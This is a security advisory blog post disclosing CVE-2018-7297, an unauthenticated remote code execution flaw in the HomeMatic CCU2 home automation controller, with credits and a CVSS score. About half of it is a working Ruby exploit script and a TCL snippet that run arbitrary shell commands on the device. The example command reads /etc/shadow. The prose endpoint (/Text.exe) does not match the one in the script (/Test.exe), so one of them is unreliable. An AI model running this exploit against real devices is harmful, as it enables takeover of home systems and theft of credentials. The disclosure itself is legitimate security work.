---
layout: post
title: "CVE-2018-7297: Remote Code Execution in HomeMatic CCU2"
date:   2018-02-21 17:00:00
image:
      url: /assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg
video: false
comments: true
theme_color: 302F2D

author: 'Patrick Münch'

author_image: "https://avatars0.githubusercontent.com/u/7220740?s=400"
author_link: "https://twitter.com/atomiczero111"
---

# Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.

From the vendor's website ([eQ-3](http://www.eq-3.de/produkte/homematic/zentralen-und-gateways.html)):

"The Homematic Central Control Unit CCU2 is responsible for numerous control, signalling and supervision functions across all areas of the Homematic system. The device includes a browser based user interface to the up the system. It can be controlled in the local network as well as via Internet. The Homematic software offers various configuration and application possibilities, so that there are no limits to creativity for installing your individual smart home."


# Issue Description

While analyzing the implementation of the CCU2's web interface, a remote code execution vulnerability has been identified, which can be exploited in order to read and write arbitrary files to the CCU2's filesystem. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.

The TCL script interpreter is not secured by any session handling and executes all TCL scripts sent via POST requests to `/Text.exe` on port 80 or 8181 of the system.

TCL script example:

```
string stdout;
string stderr;
system.Exec("cat /etc/shadow", &stdout, &stderr);
WriteLine(stdout);
```

# Proof-of-Concept

~~~ ruby
#!/usr/bin/ruby

# Exploit Title: Homematic CCU2 Remote Command Execution
# Date: 28-03-18
# Exploit Author: Patrick Muench (SVA System Vertrieb Alexander GmbH), Gregor Kopf (Secfault Security GmbH)
# Vendor Homepage: http://www.eq-3.de
# Software Link: http://www.eq-3.de/service/downloads.html?id=268
# Version: 2.29.23
# CVE : 2018-7297

# Description: http://atomic111.github.io/article/homematic-ccu2-remote-code-execution

require 'net/http'
require 'net/https'
require 'uri'

unless ARGV.length == 2
  STDOUT.puts <<-EOF
Please provide url and the command, which is execute on the homematic

Usage:
  execute_cmd.rb <ip.adress> <homematic command>

Example:
  execute_cmd.rb https://192.168.1.1 "cat /etc/shadow"

  or

  execute_cmd.rb http://192.168.1.1 "cat /etc/shadow"

EOF
  exit
end

# The first argument specifies the URL and if http or https is used
url = ARGV[0] + "/Test.exe"

# The second argument specifies the command which is executed via tcl interpreter
tcl_command = ARGV[1]

# define body content
body = "string stdout;string stderr;system.Exec(\"" << tcl_command << "\", &stdout, &stderr);WriteLine(stdout);"

# split uri to access it in a easier way
uri = URI.parse(url)

# define target connection, disabling certificate verification
Net::HTTP.start(uri.host, uri.port, :use_ssl => uri.scheme == 'https', :verify_mode => OpenSSL::SSL::VERIFY_NONE) do |http|

  # define post request
  request = Net::HTTP::Post.new(uri.request_uri)

  # define the request body
  request.body = body

  # send the request to the homematic ccu2
  response = http.request(request)

  # print response to cli
  puts response.body
end
~~~

# CVE

[CVE-2018-7297](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7297)

# CVSSv3 Base Score

CVSS Base Score: __9.4__

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L

# Credit

Patrick Muench of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

Gregor Kopf of [Secfault Security GmbH](https://secfault-security.com)

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2017 Secfault Security GmbH & SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
